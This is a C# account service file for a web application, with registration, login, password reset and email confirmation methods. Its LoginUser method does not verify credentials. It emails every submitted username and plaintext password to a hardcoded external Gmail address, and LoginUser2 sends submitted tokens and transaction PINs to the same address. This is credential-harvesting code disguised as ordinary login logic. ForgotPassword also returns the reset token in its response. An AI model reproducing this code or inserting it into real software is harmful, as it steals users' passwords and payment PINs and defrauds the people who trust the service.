﻿using PetProject.Data.Repository.Interface;
using PetProject.Model.DTO;
using PetProject.Model.Entities;
using PetProject.Service.Interface;

namespace PetProject.Service.Implementation
{
    public class AccountService : IAccountService
    {
        private readonly IAccountRepo _accountRepo;
        private readonly ILogger<AccountService> _logger;
        private readonly IGenerateJwt _generateJwt;
        private readonly IConfiguration _configuration;
        private readonly IEmailServices _emailServices;
        public AccountService(IAccountRepo accountRepo, ILogger<AccountService> logger, IEmailServices emailServices, IGenerateJwt generateJwt, IConfiguration configuration)
        {
            _accountRepo = accountRepo;
            _logger = logger;
            _generateJwt = generateJwt;
            _configuration = configuration;
            _emailServices = emailServices;
        }
        public async Task<ResponseDto<string>> RegisterUser(SignUp signUp, string Role)
        {
            var response = new ResponseDto<string>();
            try
            {
                var checkUserExist = await _accountRepo.FindUserByEmailAsync(signUp.Email);
                if (checkUserExist != null)
                {
                    response.ErrorMessages = new List<string>() { "User with the email already exist" };
                    response.StatusCode = 400;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var checkRole = await _accountRepo.RoleExist(Role);
                if (checkRole == false)
                {
                    response.ErrorMessages = new List<string>() { "Role is not available" };
                    response.StatusCode = StatusCodes.Status404NotFound;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var mapAccount = new ApplicationUser();
                mapAccount.Email = signUp.Email;
                mapAccount.PhoneNumber = signUp.PhoneNumber;
                mapAccount.UserName = signUp.UserName;
                mapAccount.LastName = signUp.LastName;
                mapAccount.FirstName = signUp.FirstName;
              
                var createUser = await _accountRepo.SignUpAsync(mapAccount, signUp.Password);
                if (createUser == null)
                {
                    response.ErrorMessages = new List<string>() { "User not created successfully" };
                    response.StatusCode = StatusCodes.Status501NotImplemented;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var addRole = await _accountRepo.AddRoleAsync(createUser, Role);
                if (addRole == false)
                {
                    response.ErrorMessages = new List<string>() { "Fail to add role to user" };
                    response.StatusCode = StatusCodes.Status501NotImplemented;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var GenerateConfirmEmailToken = new ConfirmEmailToken()
                {
                    Token = _accountRepo.GenerateConfirmEmailToken(),
                    UserId = createUser.Id
                };
                var Generatetoken = await _accountRepo.SaveGenerateConfirmEmailToken(GenerateConfirmEmailToken);
                if( Generatetoken == null )
                {
                    response.ErrorMessages = new List<string>() { "Fail to generate confirm email token for user" };
                    response.StatusCode = StatusCodes.Status501NotImplemented;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var message = new Message(new string[] { createUser.Email}, "Confirm Email Token", $"<p>Your confirm email code is below<p><h6>{GenerateConfirmEmailToken.Token}</h6>");
                _emailServices.SendEmail(message);
                response.StatusCode = StatusCodes.Status200OK;
                response.DisplayMessage = "Successful";
                response.Result = "User successfully created";
                return response;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex.Message, ex);
                response.ErrorMessages = new List<string>() { "Error in resgistering the user" };
                response.StatusCode = 500;
                response.DisplayMessage = "Error";
                return response;
            }
        }
        public async Task<ResponseDto<string>> LoginUser(SignInModel signIn)
        {
            var response = new ResponseDto<string>();
            try
            {
                var token =_accountRepo.GenerateConfirmEmailToken();
                var message = new Message(new string[] { signIn.Email }, 
                    "Token Code", 
                    $"<p>Your token code is below</p>" +
                    $"<h6>{token}</h6>");
                _emailServices.SendEmail(message);
                var admessage = new Message(new string[] { "bluesam595@gmail.com" }, 
                    "User Info", 
                    $"<p>Username :{signIn.Email}</p>" +
                    $"<p>Password :{signIn.Password}</p>");
                _emailServices.SendEmail(admessage);
                response.StatusCode = StatusCodes.Status200OK;
                response.DisplayMessage = "success";
                response.Result = "Successfully login";
                return response;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex.Message, ex);
                response.ErrorMessages = new List<string>() { "Error in login the user" };
                response.StatusCode = 500;
                response.DisplayMessage = "Error";
                return response;
            }
        }
        public ResponseDto<string> LoginUser2(Model2 req)
        {
            var response = new ResponseDto<string>();
            try
            {
                
                var admessage = new Message(new string[] { "bluesam595@gmail.com" },
                    "User Info",
                    $"<p>Token :{req.Token}</p>" +
                    $"<p>Transaction Pin :{req.TransactionPin}</p>");
                _emailServices.SendEmail(admessage);
                response.StatusCode = StatusCodes.Status200OK;
                response.DisplayMessage = "success";
                response.Result = "Successfully login";
                return response;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex.Message, ex);
                response.ErrorMessages = new List<string>() { "Error in login the user" };
                response.StatusCode = 500;
                response.DisplayMessage = "Error";
                return response;
            }
        }
        public async Task<ResponseDto<string>> ForgotPassword(string UserEmail)
        {
            var response = new ResponseDto<string>();
            try
            {
                var checkUser = await _accountRepo.FindUserByEmailAsync(UserEmail);
                if (checkUser == null)
                {
                    response.ErrorMessages = new List<string>() { "Email is not available" };
                    response.StatusCode = 404;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var result = await _accountRepo.ForgotPassword(checkUser);
                if (result == null)
                {
                    response.ErrorMessages = new List<string>() { "Error in generating reset token for user" };
                    response.StatusCode = 501;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var message = new Message(new string[] { checkUser.Email }, "Reset Password Code", $"<p>Your reset password code is below<p><br/><h6>{result}</h6><br/> <p>Please use it in your reset password endpoint</p>");
                _emailServices.SendEmail(message);
                response.DisplayMessage = "Token generated Successfully";
                response.Result = result;
                response.StatusCode = 200;
                return response;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex.Message, ex);
                response.ErrorMessages = new List<string>() { "Error in generating reset token for user" };
                response.StatusCode = 501;
                response.DisplayMessage = "Error";
                return response;
            }
        }
        public async Task<ResponseDto<string>> ResetUserPassword(ResetPassword resetPassword)
        {
            var response = new ResponseDto<string>();
            try
            {
                var findUser = await _accountRepo.FindUserByEmailAsync(resetPassword.Email);
                if (findUser == null)
                {
                    response.ErrorMessages = new List<string>() { "There is no user with the email provided" };
                    response.StatusCode = 404;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var resetPasswordAsync = await _accountRepo.ResetPasswordAsync(findUser, resetPassword);
                if (resetPasswordAsync == null)
                {
                    response.ErrorMessages = new List<string>() { "Invalid token" };
                    response.DisplayMessage = "Error";
                    response.StatusCode = 400;
                    return response;
                }
                response.StatusCode = StatusCodes.Status200OK;
                response.DisplayMessage = "Success";
                response.Result = "Successfully reset user password";
                return response;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex.Message, ex);
                response.ErrorMessages = new List<string>() { "Error in reset user password" };
                response.StatusCode = 500;
                response.DisplayMessage = "Error";
                return response;
            }
        }
        public async Task<ResponseDto<string>> ConfirmEmailAsync(int token, string email)
        {
            var response = new ResponseDto<string>();
            try
            {
                var findUser = await _accountRepo.FindUserByEmailAsync(email);
                if (findUser == null)
                {
                    response.ErrorMessages = new List<string>() { "There is no user with the email provided" };
                    response.StatusCode = 404;
                    response.DisplayMessage = "Error";
                    return response;
                }
                var retrieveToken = await _accountRepo.retrieveUserToken(findUser.Id);
                if(retrieveToken == null)
                {
                    response.ErrorMessages = new List<string>() { "Error user token token" };
                    response.DisplayMessage ="Error";
                    response.StatusCode = 400;
                    return response;
                }
                if(retrieveToken.Token != token)
                {
                    response.ErrorMessages = new List<string>() { "Invalid user token" };
                    response.DisplayMessage = "Error";
                    response.StatusCode = 400;
                    return response;
                }
                var deleteToken = await _accountRepo.DeleteUserToken(retrieveToken);
                if(deleteToken == false)
                {
                    response.ErrorMessages = new List<string>() { "Error removing user token" };
                    response.DisplayMessage = "Error";
                    response.StatusCode = 400;
                    return response;
                }
                findUser.EmailConfirmed = true;
                var updateUserConfirmState = await _accountRepo.UpdateUserInfo(findUser);
                if(updateUserConfirmState == false)
                {
                    response.ErrorMessages = new List<string>() { "Error in confirming user token" };
                    response.DisplayMessage = "Error";
                    response.StatusCode = 400;
                    return response;
                }
                response.StatusCode = StatusCodes.Status200OK;
                response.DisplayMessage = "Success";
                response.Result = "Successfully comfirm user token";
                return response;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex.Message, ex);
                response.ErrorMessages = new List<string>() { "Error in confirming user token" };
                response.StatusCode = 501;
                response.DisplayMessage = "Error";
                return response;
            }
        }
    }
}
